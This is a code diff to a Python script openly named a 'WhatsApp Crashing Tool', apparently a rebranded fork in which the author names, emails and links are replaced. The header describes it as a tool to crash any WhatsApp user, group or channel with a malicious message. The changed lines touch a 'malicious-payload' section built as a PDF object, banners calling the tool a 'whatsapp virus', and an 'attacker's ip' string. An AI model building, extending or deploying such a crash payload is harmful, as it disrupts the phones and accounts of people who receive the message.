@@ -1,12 +1,12 @@
 # Versoin: 1.3
-# Author: evilfeonix
-# Name: WhatsApp Crashing Tool
-# Website: www.evilfeonix.com 
-# Email: evilfeonix@gmail.com 
-# Latest Update: 15 - FEBUARY - 2025
+# Author: AMNA HACKER
+# Name: AMNA WhatsApp Crashing Tool
+# Website: www.Amna.Com
+# Email: cdark283@gmail.com 
+# Latest Update: 20- JUNE - 2025
 
 
-######   Welcoming to WhatsApp Crasher...
+######   Welcoming to Amna WhatsApp Crasher...
 ######   your ultimate tool to crash and sustain any whatsapp users, groups, and channels,
 ######   by just sending them malicious message.
   
@@ -36,12 +36,12 @@ def internet():
 
 def aboutus():
     slow("    Version        ::   v[1.3]")
-    slow("    Author         ::   evilfeonix")
+    slow("    Author         ::   Amna Hacker")
     slow("    Tool Name      ::   Whats Crash")
-    slow("    Latest Update  ::   15 - FEB - 2025")
+    slow("    Latest Update  ::   20 - June - 2025")
     slow("    Github         ::   Digital Firebird")
     slow("    Youtube        ::   Digital Firebird")
-    slow("    Email Address  ::   evilfeonix@gmail.com")
+    slow("    Email Address  ::   cdark283@gmail.com")
     slow(f"==========================================================={white}\n")
 
 
@@ -90,9 +90,9 @@ def set_malicious_payload(user):
 
     ======================================================================================
         ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
-    ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
-    ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
-    ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
+    ‎‏      >> whatsapp virus by AmnaHacker <<      ‎‏
+    ‎‏ >> https://github.com/Amna/Whats-Crasher << ‎‏ 
+    ‎‏ >> Whats-Crasher by AmnaHacker 😈☠😈 << ‎‏ 
     ======================================================================================
         """,
         "malicious-payload": """
@@ -108,7 +108,7 @@ def set_malicious_payload(user):
     2 0 obj
     <<
     /Title (Whatsapp\055Crasher)
-    /Author (coded\040by\040evilfeonix)
+    /Author (coded\040by\040AmnaWhatsapcrash)
     >>
     endobj
     3 0 obj
@@ -184,8 +184,8 @@ def set_malicious_payload(user):
     >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
     >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
     >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
-    >>    https://www.evilfeonix.com      <<
-            www.evilfeonix@gmail.com  
+    >>    https://www.evilf.com      <<
+            www.cdark283@gmail.com  
         """
     }
 
@@ -196,14 +196,14 @@ def set_malicious_payload(user):
     data["Hacker"] = f"""  attacker's ip: {ipaddr}...
     ======================================================================================
             ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
-        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
-        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
+        ‎‏      >> whatsapp virus by AmnaHacker  <<      ‎‏
+        ‎‏ >> https://github.com/evilfe/Whats-Crasher << ‎‏ 
         ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
     ======================================================================================"""
     data["Hacker1"] = f"""  attacker's ip: {ipaddr}...
     ======================================================================================
             ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
-        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
+        ‎‏      >> whatsapp virus by Amna Hacker  <<      ‎‏
         ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
         ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
     ======================================================================================"""
